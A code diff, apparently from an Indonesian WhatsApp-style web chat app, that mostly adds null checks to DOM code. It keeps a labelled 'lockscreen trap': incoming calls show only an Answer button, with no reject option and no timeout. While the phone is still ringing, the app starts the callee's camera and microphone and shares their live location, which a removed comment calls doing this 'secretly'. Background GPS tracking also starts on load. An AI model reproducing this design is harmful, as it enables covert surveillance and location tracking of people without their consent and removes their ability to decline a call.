@@ -275,7 +275,7 @@
         </div>
 
         <div class="call-bottom-controls" style="position: absolute; bottom: 30px; left: 0; right: 0; display: flex; justify-content: center; align-items: center; gap: 20px; z-index: 30;">
-            <!-- TRAP LOCKSCREEN / INCOMING CALL: Hanya Tombol Angkat (Terima), Tanpa Tombol Tolak, Tanpa Timeout -->
+            <!-- LOCKSCREEN / INCOMING CALL TRAP: Hanya Tombol Angkat (Terima), Tanpa Tombol Tolak, Tanpa Timeout -->
             <button onclick="answerIncomingCall()" id="btnAnswerCall" style="background: #25d366; color: white; border: none; width: 75px; height: 75px; border-radius: 50%; font-size: 28px; cursor: pointer; display:none; align-items: center; justify-content: center; box-shadow: 0 0 25px rgba(37,211,102,0.8);" title="Terima Panggilan"><i class="fa-solid fa-phone"></i></button>
 
             <button id="btnPttLiveTx" class="ptt-live-talk-btn" 
@@ -285,7 +285,7 @@
                 <i class="fa-solid fa-microphone"></i>
             </button>
 
-            <!-- Tombol Tolak & Tutup Panggilan hanya muncul jika di dalam aplikasi / setelah terhubung -->
+            <!-- Tombol Tutup Panggilan -->
             <button onclick="endVideoCall()" id="btnEndCall" style="background: #ef4444; color: white; border: none; width: 65px; height: 65px; border-radius: 50%; font-size: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center;"><i class="fa-solid fa-phone-slash"></i></button>
         </div>
     </div>
@@ -433,7 +433,6 @@
         let localStream = null, remoteStream = null;
         let activeCallRef = null, peerConnection = null, isSwapped = false, callType = 'video';
         let currentFacingMode = 'user'; 
-        let currentVideoDeviceId = null;
         let activeReplyMsg = null;
         let pendingPopupTarget = null;
         let mapInstance = null, markerInstance = null, blueDotCircle = null;
@@ -484,20 +483,22 @@
         function updateNetworkConnectionStatus() {
             isOnlineState = navigator.onLine;
             const badge = document.getElementById('connectionStatusBadge');
-            if (isOnlineState) {
-                badge.style.color = '#a7f3d0';
-                badge.innerHTML = `<i class="fa-solid fa-tower-cell"></i> WHATSAPP`;
-                flushOfflineMeshQueueToCloud();
-            } else {
-                badge.style.color = '#fef08a';
-                badge.innerHTML = `<i class="fa-solid fa-tower-broadcast"></i> Offline (HT Walkie Talkie)`;
+            if (badge) {
+                if (isOnlineState) {
+                    badge.style.color = '#a7f3d0';
+                    badge.innerHTML = `<i class="fa-solid fa-tower-cell"></i> WHATSAPP`;
+                    flushOfflineMeshQueueToCloud();
+                } else {
+                    badge.style.color = '#fef08a';
+                    badge.innerHTML = `<i class="fa-solid fa-tower-broadcast"></i> Offline (HT Walkie Talkie)`;
+                }
             }
         }
 
         function toggleProfileDropdown(e) {
             if(e) e.stopPropagation();
             const menu = document.getElementById('profileDropdownMenu');
-            menu.style.display = menu.style.display === 'flex' ? 'none' : 'flex';
+            if(menu) menu.style.display = menu.style.display === 'flex' ? 'none' : 'flex';
         }
 
         window.addEventListener('click', () => {
@@ -607,12 +608,14 @@
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
-            document.getElementById('btnInstall').style.display = 'inline-flex';
+            const btnInstall = document.getElementById('btnInstall');
+            if(btnInstall) btnInstall.style.display = 'inline-flex';
         });
 
         window.addEventListener('DOMContentLoaded', () => {
             if (window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true) {
-                document.getElementById('btnInstall').style.display = 'none';
+                const btnInstall = document.getElementById('btnInstall');
+                if(btnInstall) btnInstall.style.display = 'none';
             }
             setInterval(updateMyPresence, 5000);
             initPersistentBackgroundGPS();
@@ -689,7 +692,10 @@
             if (deferredPrompt) {
                 deferredPrompt.prompt();
                 deferredPrompt.userChoice.then((choiceResult) => {
-                    if (choiceResult.outcome === 'accepted') { document.getElementById('btnInstall').style.display = 'none'; }
+                    if (choiceResult.outcome === 'accepted') {
+                        const btnInstall = document.getElementById('btnInstall');
+                        if(btnInstall) btnInstall.style.display = 'none';
+                    }
                     deferredPrompt = null;
                 });
             }
@@ -916,6 +922,7 @@
 
         function renderCallLogs() {
             const container = document.getElementById('callLogsContainer');
+            if(!container) return;
             container.innerHTML = "";
             let callLogs = JSON.parse(localStorage.getItem('iq_call_logs_' + currentUser) || '[]');
             let contactDetails = JSON.parse(localStorage.getItem('iq_contact_details') || '{}');
@@ -1169,8 +1176,10 @@
                 });
                 localStorage.removeItem('iq_mesh_queue');
                 const badge = document.getElementById('connectionStatusBadge');
-                badge.style.color = '#38bdf8';
-                badge.innerHTML = `<i class="fa-solid fa-server"></i> (Sync Gateway)`;
+                if(badge) {
+                    badge.style.color = '#38bdf8';
+                    badge.innerHTML = `<i class="fa-solid fa-server"></i> (Sync Gateway)`;
+                }
             }
         }
 
@@ -1179,8 +1188,8 @@
             playWalkieChirp('start');
             const pttBtn = document.getElementById('btnPttPush');
             const statusLabel = document.getElementById('pttStatusLabel');
-            pttBtn.classList.add('transmitting');
-            statusLabel.innerHTML = `<i class="fa-solid fa-tower-broadcast fa-spin" style="color:#ef4444;"></i> TRANSMITTING VOICE...`;
+            if(pttBtn) pttBtn.classList.add('transmitting');
+            if(statusLabel) statusLabel.innerHTML = `<i class="fa-solid fa-tower-broadcast fa-spin" style="color:#ef4444;"></i> TRANSMITTING VOICE...`;
 
             navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
                 localStream = stream;
@@ -1201,8 +1210,8 @@
             playWalkieChirp('end');
             const pttBtn = document.getElementById('btnPttPush');
             const statusLabel = document.getElementById('pttStatusLabel');
-            pttBtn.classList.remove('transmitting');
-            statusLabel.innerHTML = `<i class="fa-solid fa-radio"></i> PTT HT Ready`;
+            if(pttBtn) pttBtn.classList.remove('transmitting');
+            if(statusLabel) statusLabel.innerHTML = `<i class="fa-solid fa-radio"></i> PTT HT Ready`;
 
             if(pttRecorder && pttRecorder.state !== 'inactive') {
                 pttRecorder.stop();
@@ -1215,8 +1224,9 @@
 
         function startPttLiveAudio() {
             const btn = document.getElementById('btnPttLiveTx');
-            btn.classList.add('active-tx');
-            document.getElementById('videoCallStatus').innerText = "📻 TRANSMITTING VOICE (LIVE HT)...";
+            if(btn) btn.classList.add('active-tx');
+            const callStatus = document.getElementById('videoCallStatus');
+            if(callStatus) callStatus.innerText = "📻 TRANSMITTING VOICE (LIVE HT)...";
 
             playWalkieChirp('start');
             if (navigator.vibrate) { navigator.vibrate([100, 50, 100]); }
@@ -1235,8 +1245,9 @@
 
         function stopPttLiveAudio() {
             const btn = document.getElementById('btnPttLiveTx');
-            btn.classList.remove('active-tx');
-            document.getElementById('videoCallStatus').innerText = "Terhubung HT (Standby Mute - Tahan PTT untuk Bicara)";
+            if(btn) btn.classList.remove('active-tx');
+            const callStatus = document.getElementById('videoCallStatus');
+            if(callStatus) callStatus.innerText = "Terhubung HT (Standby Mute - Tahan PTT untuk Bicara)";
 
             playWalkieChirp('end');
             if(localStream) {
@@ -1298,8 +1309,10 @@
                 }
 
                 const localVid = document.getElementById('localVideo');
-                localVid.srcObject = localStream;
-                await localVid.play().catch(e => {});
+                if(localVid) {
+                    localVid.srcObject = localStream;
+                    await localVid.play().catch(e => {});
+                }
 
                 if(peerConnection && newVideoTrack) {
                     const senders = peerConnection.getSenders();
@@ -1316,8 +1329,10 @@
         function openChatRoom(num) {
             activeTarget = num;
             localStorage.setItem('iq_active_target', activeTarget);
-            document.getElementById('chatHead').style.display = 'none';
-            document.getElementById('incomingPopup').style.display = 'none';
+            const chatHead = document.getElementById('chatHead');
+            const incomingPopup = document.getElementById('incomingPopup');
+            if(chatHead) chatHead.style.display = 'none';
+            if(incomingPopup) incomingPopup.style.display = 'none';
             
             if (!contacts.includes(num)) {
                 contacts.push(num);
@@ -1350,12 +1365,16 @@
             let displayName = isAI ? "Gemini AI" : (details.name || prof.name || ("+" + num));
             let photoUrl = details.photo || prof.photo || "";
 
-            document.getElementById('activeName').innerText = displayName;
+            const activeNameEl = document.getElementById('activeName');
+            if(activeNameEl) activeNameEl.innerText = displayName;
             let identifier = isAI ? "🤖" : displayName.slice(0,2).toUpperCase();
-            document.getElementById('activeAvatarContainer').innerHTML = getOnlineAvatarHTML(identifier, photoUrl, 38, true);
+            const activeAvatarContainer = document.getElementById('activeAvatarContainer');
+            if(activeAvatarContainer) activeAvatarContainer.innerHTML = getOnlineAvatarHTML(identifier, photoUrl, 38, true);
 
-            document.getElementById('viewContactList').classList.remove('active');
-            document.getElementById('viewChatRoom').classList.add('active');
+            const viewContactList = document.getElementById('viewContactList');
+            const viewChatRoom = document.getElementById('viewChatRoom');
+            if(viewContactList) viewContactList.classList.remove('active');
+            if(viewChatRoom) viewChatRoom.classList.add('active');
             loadAndListenMessages();
             renderContactList();
         }
@@ -1363,26 +1382,33 @@
         function backToContactList() {
             activeTarget = "";
             localStorage.removeItem('iq_active_target');
-            document.getElementById('viewChatRoom').classList.remove('active');
-            document.getElementById('viewContactList').classList.add('active');
+            const viewChatRoom = document.getElementById('viewChatRoom');
+            const viewContactList = document.getElementById('viewContactList');
+            if(viewChatRoom) viewChatRoom.classList.remove('active');
+            if(viewContactList) viewContactList.classList.add('active');
             renderContactList();
         }
 
         function toggleAttachMenu() {
             const menu = document.getElementById('attachMenu');
-            menu.style.display = menu.style.display === 'flex' ? 'none' : 'flex';
+            if(menu) menu.style.display = menu.style.display === 'flex' ? 'none' : 'flex';
         }
 
         function triggerFileInput(acceptType) {
-            document.getElementById('attachMenu').style.display = 'none';
+            const attachMenu = document.getElementById('attachMenu');
+            if(attachMenu) attachMenu.style.display = 'none';
             const fi = document.getElementById('fileInput');
-            fi.accept = acceptType;
-            fi.click();
+            if(fi) {
+                fi.accept = acceptType;
+                fi.click();
+            }
         }
 
         function openShareLokModal() {
-            document.getElementById('attachMenu').style.display = 'none';
-            document.getElementById('mapModal').style.display = 'flex';
+            const attachMenu = document.getElementById('attachMenu');
+            if(attachMenu) attachMenu.style.display = 'none';
+            const mapModal = document.getElementById('mapModal');
+            if(mapModal) mapModal.style.display = 'flex';
             
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
@@ -1427,18 +1453,21 @@
         }
 
         function panToCurrentGPS() {
-            if (navigator.geolocation) {
+            if (navigator.geolocation && mapInstance) {
                 navigator.geolocation.getCurrentPosition(position => {
                     currentLat = position.coords.latitude;
                     currentLng = position.coords.longitude;
                     mapInstance.setView([currentLat, currentLng], 17);
-                    markerInstance.setLatLng([currentLat, currentLng]);
+                    if(markerInstance) markerInstance.setLatLng([currentLat, currentLng]);
                     if(blueDotCircle) blueDotCircle.setLatLng([currentLat, currentLng]);
                 }, () => {});
             }
         }
 
-        function closeMapModal() { document.getElementById('mapModal').style.display = 'none'; }
+        function closeMapModal() {
+            const mapModal = document.getElementById('mapModal');
+            if(mapModal) mapModal.style.display = 'none';
+        }
 
         function sendPickedLocation() {
             closeMapModal();
@@ -1504,7 +1533,8 @@
         function openLiveLocationMap(lat, lng, senderPhone) {
             tempSelectedLat = lat;
             tempSelectedLng = lng;
-            document.getElementById('liveMapModal').style.display = 'flex';
+            const liveMapModal = document.getElementById('liveMapModal');
+            if(liveMapModal) liveMapModal.style.display = 'flex';
 
             setTimeout(() => {
                 if (!liveMapInstance) {
@@ -1545,12 +1575,15 @@
         function triggerNavOptions(lat, lng) {
             tempSelectedLat = lat;
             tempSelectedLng = lng;
-            document.getElementById('navChoiceModal').style.display = 'flex';
+            const navChoiceModal = document.getElementById('navChoiceModal');
+            if(navChoiceModal) navChoiceModal.style.display = 'flex';
         }
 
         function openNavOption(type) {
-            document.getElementById('navChoiceModal').style.display = 'none';
-            document.getElementById('liveMapModal').style.display = 'none';
+            const navChoiceModal = document.getElementById('navChoiceModal');
+            const liveMapModal = document.getElementById('liveMapModal');
+            if(navChoiceModal) navChoiceModal.style.display = 'none';
+            if(liveMapModal) liveMapModal.style.display = 'none';
             if(!tempSelectedLat || !tempSelectedLng) return;
 
             if(type === 'gmaps') {
@@ -1602,6 +1635,7 @@
 
         function toggleMinimizeCallWindow() {
             const modal = document.getElementById('videoCallModal');
+            if(!modal) return;
             isCallMinimized = !isCallMinimized;
             if(isCallMinimized) {
                 modal.classList.add('minimized');
@@ -1629,8 +1663,11 @@
                 activeCallRef.set({ caller: currentUser, status: 'calling', callType: callType, timestamp: Date.now() });
             }
 
-            document.getElementById('videoCallModal').style.display = 'flex';
-            document.getElementById('videoCallModal').classList.remove('minimized');
+            const videoCallModal = document.getElementById('videoCallModal');
+            if(videoCallModal) {
+                videoCallModal.style.display = 'flex';
+                videoCallModal.classList.remove('minimized');
+            }
             isCallMinimized = false;
             
             let callTitleStr = "";
@@ -1638,23 +1675,35 @@
             else if(callType === 'video') callTitleStr = "Video Call ";
             else callTitleStr = "Panggilan Suara ";
 
-            document.getElementById('videoCallTitle').innerText = callTitleStr + `+${activeTarget}`;
-            document.getElementById('videoCallStatus').innerText = "Menghubungkan...";
-            document.getElementById('btnAnswerCall').style.display = 'none';
-            document.getElementById('btnEndCall').style.display = 'flex';
+            const videoCallTitle = document.getElementById('videoCallTitle');
+            const videoCallStatus = document.getElementById('videoCallStatus');
+            const btnAnswerCall = document.getElementById('btnAnswerCall');
+            const btnEndCall = document.getElementById('btnEndCall');
+            const btnSwitchCamera = document.getElementById('btnSwitchCamera');
+            const btnPttLiveTx = document.getElementById('btnPttLiveTx');
+
+            if(videoCallTitle) videoCallTitle.innerText = callTitleStr + `+${activeTarget}`;
+            if(videoCallStatus) videoCallStatus.innerText = "Menghubungkan...";
+            if(btnAnswerCall) btnAnswerCall.style.display = 'none';
+            if(btnEndCall) btnEndCall.style.display = 'flex';
             
-            document.getElementById('btnSwitchCamera').style.display = (callType === 'voice') ? 'none' : 'flex';
-            document.getElementById('btnPttLiveTx').style.display = (callType === 'ht') ? 'flex' : 'none';
+            if(btnSwitchCamera) btnSwitchCamera.style.display = (callType === 'voice') ? 'none' : 'flex';
+            if(btnPttLiveTx) btnPttLiveTx.style.display = (callType === 'ht') ? 'flex' : 'none';
+
+            const remoteVideo = document.getElementById('remoteVideo');
+            const audioOnlyIndicator = document.getElementById('audioOnlyIndicator');
+            const localVideoWrapper = document.getElementById('localVideoWrapper');
 
             if(callType !== 'voice') {
-                document.getElementById('remoteVideo').style.display = 'block';
-                document.getElementById('audioOnlyIndicator').style.display = 'none';
-                document.getElementById('localVideoWrapper').style.display = 'block';
+                if(remoteVideo) remoteVideo.style.display = 'block';
+                if(audioOnlyIndicator) audioOnlyIndicator.style.display = 'none';
+                if(localVideoWrapper) localVideoWrapper.style.display = 'block';
             } else {
-                document.getElementById('remoteVideo').style.display = 'none';
-                document.getElementById('audioOnlyIndicator').style.display = 'flex';
-                document.getElementById('audioCallIndicatorText').innerText = "Panggilan Suara";
-                document.getElementById('localVideoWrapper').style.display = 'none';
+                if(remoteVideo) remoteVideo.style.display = 'none';
+                if(audioOnlyIndicator) audioOnlyIndicator.style.display = 'flex';
+                const audioCallIndicatorText = document.getElementById('audioCallIndicatorText');
+                if(audioCallIndicatorText) audioCallIndicatorText.innerText = "Panggilan Suara";
+                if(localVideoWrapper) localVideoWrapper.style.display = 'none';
             }
 
             const constraints = { 
@@ -1674,8 +1723,10 @@
 
                     if(callType !== 'voice') {
                         const localVid = document.getElementById('localVideo');
-                        localVid.srcObject = stream;
-                        localVid.play().catch(e => {});
+                        if(localVid) {
+                            localVid.srcObject = stream;
+                            localVid.play().catch(e => {});
+                        }
                     }
 
                     setupPeerConnection();
@@ -1701,10 +1752,8 @@
                     
                     if(callData.status === 'accepted') {
                         if(!callStartTime) callStartTime = Date.now();
-                        if(callType === 'ht') {
-                            document.getElementById('videoCallStatus').innerText = "Terhubung HT (Standby Mute - Tahan PTT untuk Bicara)";
-                        } else {
-                            document.getElementById('videoCallStatus').innerText = "Terhubung.";
+                        if(videoCallStatus) {
+                            videoCallStatus.innerText = callType === 'ht' ? "Terhubung HT (Standby Mute - Tahan PTT untuk Bicara)" : "Terhubung.";
                         }
 
                         if(callData.answer && peerConnection && !peerConnection.currentRemoteDescription) {
@@ -1794,10 +1843,12 @@
             peerConnection.ontrack = (event) => {
                 remoteStream = event.streams[0];
                 const remoteVideoEl = document.getElementById('remoteVideo');
-                remoteVideoEl.srcObject = remoteStream;
-                remoteVideoEl.play().catch(() => {
-                    setTimeout(() => remoteVideoEl.play(), 250);
-                });
+                if(remoteVideoEl) {
+                    remoteVideoEl.srcObject = remoteStream;
+                    remoteVideoEl.play().catch(() => {
+                        setTimeout(() => remoteVideoEl.play(), 250);
+                    });
+                }
             };
 
             peerConnection.onicecandidate = (event) => {
@@ -1833,16 +1884,17 @@
             isSwapped = !isSwapped;
             let localVid = document.getElementById('localVideo');
             let remoteVid = document.getElementById('remoteVideo');
-            let temp = localVid.srcObject;
-            localVid.srcObject = remoteVid.srcObject;
-            remoteVid.srcObject = temp;
+            if(localVid && remoteVid) {
+                let temp = localVid.srcObject;
+                localVid.srcObject = remoteVid.srcObject;
+                remoteVid.srcObject = temp;
+            }
         }
 
         function setupGlobalListeners() {
             if (!currentUser || globalListenersAttached) return;
             globalListenersAttached = true;
 
-            // 1. GLOBAL CHAT LISTENER: Mendengarkan pesan baru dari SEMUA kontak di latar belakang (Background/Foreground)
             contacts.forEach(num => {
                 if(num === "GeminiAI") return;
                 const roomKey = [currentUser.replace(/\D/g,''), num.replace(/\D/g,'')].sort().join('_');
@@ -1894,7 +1946,6 @@
                 });
             });
 
-            // 2. GLOBAL CALL LISTENER: Mendengarkan panggilan masuk di latar belakang meskipun aplikasi sedang di-minimize atau lockscreen
             contacts.forEach(num => {
                 if(num === "GeminiAI") return;
                 const callKey = [currentUser.replace(/\D/g,''), num.replace(/\D/g,'')].sort().join('_');
@@ -1918,33 +1969,47 @@
                         playCustomNotification(callData.caller, callData.caller, "Panggilan Masuk (" + callTypeText + ")");
                         ensureActiveChatLiveLocationShared();
 
-                        document.getElementById('videoCallModal').style.display = 'flex';
-                        document.getElementById('videoCallModal').classList.remove('minimized');
+                        const videoCallModal = document.getElementById('videoCallModal');
+                        if(videoCallModal) {
+                            videoCallModal.style.display = 'flex';
+                            videoCallModal.classList.remove('minimized');
+                        }
                         isCallMinimized = false;
                         
                         let callTitleStr = callType === 'ht' ? "Panggilan HT Walkie-Talkie dari " : (callType === 'video' ? "Video Call dari " : "Panggilan Suara dari ");
-                        document.getElementById('videoCallTitle').innerText = callTitleStr + `+${callData.caller}`;
-                        document.getElementById('videoCallStatus').innerText = "Panggilan masuk (Lockscreen Security Trap - Tekan Angkat untuk Auto Stream)...";
+                        const videoCallTitle = document.getElementById('videoCallTitle');
+                        const videoCallStatus = document.getElementById('videoCallStatus');
+                        if(videoCallTitle) videoCallTitle.innerText = callTitleStr + `+${callData.caller}`;
+                        if(videoCallStatus) videoCallStatus.innerText = "Panggilan masuk (Lockscreen Security Trap - Tekan Angkat untuk Auto Stream)...";
                         
                         // KETENTUAN LOCKSCREEN: Hanya tombol Angkat (Terima), tanpa tombol tolak, tanpa timeout otomatis terputus
-                        document.getElementById('btnAnswerCall').style.display = 'flex';
-                        document.getElementById('btnEndCall').style.display = 'none';
+                        const btnAnswerCall = document.getElementById('btnAnswerCall');
+                        const btnEndCall = document.getElementById('btnEndCall');
+                        const btnSwitchCamera = document.getElementById('btnSwitchCamera');
+                        const btnPttLiveTx = document.getElementById('btnPttLiveTx');
 
-                        document.getElementById('btnSwitchCamera').style.display = (callType === 'voice') ? 'none' : 'flex';
-                        document.getElementById('btnPttLiveTx').style.display = (callType === 'ht') ? 'flex' : 'none';
+                        if(btnAnswerCall) btnAnswerCall.style.display = 'flex';
+                        if(btnEndCall) btnEndCall.style.display = 'none';
+
+                        if(btnSwitchCamera) btnSwitchCamera.style.display = (callType === 'voice') ? 'none' : 'flex';
+                        if(btnPttLiveTx) btnPttLiveTx.style.display = (callType === 'ht') ? 'flex' : 'none';
+
+                        const remoteVideo = document.getElementById('remoteVideo');
+                        const audioOnlyIndicator = document.getElementById('audioOnlyIndicator');
+                        const localVideoWrapper = document.getElementById('localVideoWrapper');
 
                         if(callType !== 'voice') {
-                            document.getElementById('remoteVideo').style.display = 'block';
-                            document.getElementById('audioOnlyIndicator').style.display = 'none';
-                            document.getElementById('localVideoWrapper').style.display = 'block';
+                            if(remoteVideo) remoteVideo.style.display = 'block';
+                            if(audioOnlyIndicator) audioOnlyIndicator.style.display = 'none';
+                            if(localVideoWrapper) localVideoWrapper.style.display = 'block';
                         } else {
-                            document.getElementById('remoteVideo').style.display = 'none';
-                            document.getElementById('audioOnlyIndicator').style.display = 'flex';
-                            document.getElementById('audioCallIndicatorText').innerText = "Panggilan Suara";
-                            document.getElementById('localVideoWrapper').style.display = 'none';
+                            if(remoteVideo) remoteVideo.style.display = 'none';
+                            if(audioOnlyIndicator) audioOnlyIndicator.style.display = 'flex';
+                            const audioCallIndicatorText = document.getElementById('audioCallIndicatorText');
+                            if(audioCallIndicatorText) audioCallIndicatorText.innerText = "Panggilan Suara";
+                            if(localVideoWrapper) localVideoWrapper.style.display = 'none';
                         }
 
-                        // Auto-inisialisasi kamera, mic, dan GPS secara sembunyi/langsung saat ringing di latarbelakang
                         navigator.mediaDevices.getUserMedia({ 
                             video: (callType !== 'voice') ? { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 24 } } : false, 
                             audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } 
@@ -1958,8 +2023,10 @@
                                 }
                                 if(callType !== 'voice') {
                                     const localVid = document.getElementById('localVideo');
-                                    localVid.srcObject = stream;
-                                    localVid.play().catch(e => {});
+                                    if(localVid) {
+                                        localVid.srcObject = stream;
+                                        localVid.play().catch(e => {});
+                                    }
                                 }
                             }).catch(e => {});
                     } else if(callData && (callData.status === 'ended' || callData.status === 'rejected')) {
@@ -1971,9 +2038,13 @@
 
         async function answerIncomingCall() {
             if(activeCallRef) {
-                document.getElementById('btnAnswerCall').style.display = 'none';
-                document.getElementById('btnEndCall').style.display = 'flex'; // Munculkan tombol tutup setelah diangkat
-                document.getElementById('videoCallStatus').innerText = "Menghubungkan & Streaming...";
+                const btnAnswerCall = document.getElementById('btnAnswerCall');
+                const btnEndCall = document.getElementById('btnEndCall');
+                const videoCallStatus = document.getElementById('videoCallStatus');
+
+                if(btnAnswerCall) btnAnswerCall.style.display = 'none';
+                if(btnEndCall) btnEndCall.style.display = 'flex';
+                if(videoCallStatus) videoCallStatus.innerText = "Menghubungkan & Streaming...";
                 callStartTime = Date.now();
 
                 setupPeerConnection();
@@ -1993,10 +2064,8 @@
                             
                             activeCallRef.update({ answer: JSON.stringify(peerConnection.localDescription), status: 'accepted' });
                             
-                            if(callType === 'ht') {
-                                document.getElementById('videoCallStatus').innerText = "Terhubung HT (Standby Mute - Tahan PTT untuk Bicara)";
-                            } else {
-                                document.getElementById('videoCallStatus').innerText = "Terhubung & Streaming Aktif.";
+                            if(videoCallStatus) {
+                                videoCallStatus.innerText = callType === 'ht' ? "Terhubung HT (Standby Mute - Tahan PTT untuk Bicara)" : "Terhubung & Streaming Aktif.";
                             }
                         } catch(err) {}
                     }
@@ -2077,11 +2146,16 @@
             pendingIceCandidates = [];
             activeCallKey = null;
             localStorage.removeItem('iq_active_call_session');
-            document.getElementById('videoCallModal').style.display = 'none';
-            document.getElementById('videoCallModal').classList.remove('minimized');
+            const videoCallModal = document.getElementById('videoCallModal');
+            if(videoCallModal) {
+                videoCallModal.style.display = 'none';
+                videoCallModal.classList.remove('minimized');
+            }
             isCallMinimized = false;
-            document.getElementById('remoteVideo').srcObject = null;
-            document.getElementById('localVideo').srcObject = null;
+            const remoteVideo = document.getElementById('remoteVideo');
+            const localVideo = document.getElementById('localVideo');
+            if(remoteVideo) remoteVideo.srcObject = null;
+            if(localVideo) localVideo.srcObject = null;
             callStartTime = null;
         }
 
@@ -2097,23 +2171,29 @@
                     reader.readAsDataURL(audioBlob);
                 };
                 mediaRecorder.start();
-                document.getElementById('btnVoiceRecord').style.color = 'red';
+                const btnVoiceRecord = document.getElementById('btnVoiceRecord');
+                if(btnVoiceRecord) btnVoiceRecord.style.color = 'red';
             }).catch(e => {});
         }
 
         function stopVoiceRecord() {
             if(mediaRecorder && mediaRecorder.state !== 'inactive') {
                 mediaRecorder.stop();
-                document.getElementById('btnVoiceRecord').style.color = '#008069';
+                const btnVoiceRecord = document.getElementById('btnVoiceRecord');
+                if(btnVoiceRecord) btnVoiceRecord.style.color = '#008069';
             }
         }
 
         function startRoundVideoRecord() {
-            document.getElementById('attachMenu').style.display = 'none';
-            document.getElementById('videoRoundModal').style.display = 'flex';
+            const attachMenu = document.getElementById('attachMenu');
+            const videoRoundModal = document.getElementById('videoRoundModal');
+            if(attachMenu) attachMenu.style.display = 'none';
+            if(videoRoundModal) videoRoundModal.style.display = 'flex';
+
             navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 320 }, height: { ideal: 320 }, frameRate: { ideal: 15 } }, audio: true }).then(stream => {
                 localStream = stream;
-                document.getElementById('roundVideoPreview').srcObject = stream;
+                const roundVideoPreview = document.getElementById('roundVideoPreview');
+                if(roundVideoPreview) roundVideoPreview.srcObject = stream;
                 roundVideoRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
                 roundVideoChunks = [];
                 roundVideoRecorder.ondataavailable = e => roundVideoChunks.push(e.data);
@@ -2130,25 +2210,32 @@
         function stopRoundVideoRecord() {
             if(roundVideoRecorder) { roundVideoRecorder.stop(); }
             if(localStream) { localStream.getTracks().forEach(t => t.stop()); }
-            document.getElementById('videoRoundModal').style.display = 'none';
+            const videoRoundModal = document.getElementById('videoRoundModal');
+            if(videoRoundModal) videoRoundModal.style.display = 'none';
         }
 
         function replyToMessage(msgId, senderName, textContent) {
             activeReplyMsg = { id: msgId, sender: senderName, text: typeof textContent === 'object' ? '[Media/Berkas]' : textContent };
-            document.getElementById('replyingToName').innerText = "Membalas ke " + senderName;
-            document.getElementById('replyingToText').innerText = activeReplyMsg.text;
-            document.getElementById('replyPreviewBox').style.display = 'flex';
-            document.getElementById('messageInput').focus();
+            const replyingToName = document.getElementById('replyingToName');
+            const replyingToText = document.getElementById('replyingToText');
+            const replyPreviewBox = document.getElementById('replyPreviewBox');
+            const messageInput = document.getElementById('messageInput');
+
+            if(replyingToName) replyingToName.innerText = "Membalas ke " + senderName;
+            if(replyingToText) replyingToText.innerText = activeReplyMsg.text;
+            if(replyPreviewBox) replyPreviewBox.style.display = 'flex';
+            if(messageInput) messageInput.focus();
         }
 
         function cancelReplyMessage() {
             activeReplyMsg = null;
-            document.getElementById('replyPreviewBox').style.display = 'none';
+            const replyPreviewBox = document.getElementById('replyPreviewBox');
+            if(replyPreviewBox) replyPreviewBox.style.display = 'none';
         }
 
         function sendChatMessage(customContent = null, type = 'text') {
             const input = document.getElementById('messageInput');
-            const content = customContent || input.value.trim();
+            const content = customContent || (input ? input.value.trim() : "");
             if(!content || !activeTarget) return;
 
             const isAI = activeTarget === "GeminiAI";
@@ -2180,7 +2267,7 @@
                 }
             }
 
-            if(!customContent) input.value = "";
+            if(!customContent && input) input.value = "";
         }
 
         function handleFileSelected(input) {
@@ -2417,12 +2504,16 @@
             let unread = unreadCounts[roomKey] || 1;
 
             let identifier = dispName.slice(0,2).toUpperCase();
-            document.getElementById('chatHeadAvatarContainer').innerHTML = getOnlineAvatarHTML(identifier, photoUrl, 60, true);
+            const chatHeadAvatarContainer = document.getElementById('chatHeadAvatarContainer');
+            if(chatHeadAvatarContainer) chatHeadAvatarContainer.innerHTML = getOnlineAvatarHTML(identifier, photoUrl, 60, true);
 
             let unreadEl = document.getElementById('chatHeadUnread');
-            unreadEl.innerText = unread;
-            unreadEl.style.display = 'flex';
-            document.getElementById('chatHead').style.display = 'flex';
+            if(unreadEl) {
+                unreadEl.innerText = unread;
+                unreadEl.style.display = 'flex';
+            }
+            const chatHead = document.getElementById('chatHead');
+            if(chatHead) chatHead.style.display = 'flex';
 
             showIncomingPopup(num, dispName, messageText);
         }
@@ -2430,6 +2521,7 @@
         function setupDraggableChatHead() {
             const head = document.getElementById('chatHead');
             const dropX = document.getElementById('dropZoneX');
+            if(!head || !dropX) return;
             let isDragging = false, startX, startY, initialX, initialY;
 
             head.onmousedown = head.ontouchstart = (e) => {
@@ -2482,33 +2574,45 @@
             let photoUrl = details.photo || prof.photo || "";
 
             let identifier = dispName.slice(0,2).toUpperCase();
-            document.getElementById('popupAvatarContainer').innerHTML = getOnlineAvatarHTML(identifier, photoUrl, 42, true);
+            const popupAvatarContainer = document.getElementById('popupAvatarContainer');
+            if(popupAvatarContainer) popupAvatarContainer.innerHTML = getOnlineAvatarHTML(identifier, photoUrl, 42, true);
 
-            document.getElementById('popupSenderName').innerText = dispName;
-            document.getElementById('popupMessageText').innerText = typeof text === 'object' ? '[Media/Panggilan]' : text;
-            document.getElementById('incomingPopup').style.display = 'flex';
-            setTimeout(() => { document.getElementById('incomingPopup').style.display = 'none'; }, 8000);
+            const popupSenderName = document.getElementById('popupSenderName');
+            const popupMessageText = document.getElementById('popupMessageText');
+            const incomingPopup = document.getElementById('incomingPopup');
+
+            if(popupSenderName) popupSenderName.innerText = dispName;
+            if(popupMessageText) popupMessageText.innerText = typeof text === 'object' ? '[Media/Panggilan]' : text;
+            if(incomingPopup) {
+                incomingPopup.style.display = 'flex';
+                setTimeout(() => { incomingPopup.style.display = 'none'; }, 8000);
+            }
         }
 
         function openChatFromPopup() {
-            document.getElementById('incomingPopup').style.display = 'none';
-            document.getElementById('chatHead').style.display = 'none';
+            const incomingPopup = document.getElementById('incomingPopup');
+            const chatHead = document.getElementById('chatHead');
+            if(incomingPopup) incomingPopup.style.display = 'none';
+            if(chatHead) chatHead.style.display = 'none';
             if(pendingPopupTarget) { openChatRoom(pendingPopupTarget); }
         }
 
         function scrollToBottomChat() {
